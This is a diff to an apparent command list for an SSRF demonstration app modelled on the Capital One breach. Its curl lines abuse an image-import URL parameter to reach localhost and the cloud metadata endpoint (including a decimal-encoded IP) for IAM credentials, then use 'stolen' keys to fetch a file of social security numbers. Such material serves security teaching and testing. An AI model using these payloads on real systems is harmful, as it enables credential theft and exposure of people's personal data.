@@ -1,5 +1,10 @@
-curl -i "https://your-app.onrender.com/proxy?url=https://via.placeholder.com/150"
-curl -i "https://your-app.onrender.com/s3/customer-backups-2026/social_security_numbers.csv"
-curl -i "https://your-app.onrender.com/proxy?url=http://localhost:10000/internal/metrics"
-curl -i "https://your-app.onrender.com/proxy?url=http://localhost:10000/latest/meta-data/iam/security-credentials/WAF-Admin-Role"
-curl -i -H "Authorization: AWS AKIA_STOLEN_CAPITAL_ONE_KEYS" "https://your-app.onrender.com/s3/customer-backups-2026/social_security_numbers.csv
+curl -i "https://ssrf-demo.onrender.com/api/v1/avatar/import?url=https://i.pinimg.com/1200x/d6/c4/ce/d6c4ce17fe18176c7d433021079fe1aa.jpg"
+curl -i "https://ssrf-demo.onrender.com/s3/customer-backups-2026/social_security_numbers.csv"
+curl -i "https://ssrf-demo.onrender.com/api/v1/avatar/import?url=http://localhost:8080/internal/metrics"
+curl -i "https://ssrf-demo.onrender.com/api/v1/avatar/import?url=http://localhost:8080/latest/meta-data/iam/security-credentials/WAF-Admin-Role"
+curl -i -H "Authorization: AWS_ASIA_STOLEN_CAPITAL_ONE_KEYS" "https://ssrf-demo.com/s3/customer-backups-2026/social_security_numbers.csv
+
+https://i.pinimg.com/1200x/d6/c4/ce/d6c4ce17fe18176c7d433021079fe1aa.jpg
+http://localhost:8080/internal/metrics
+http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Admin-Role
+2852039166
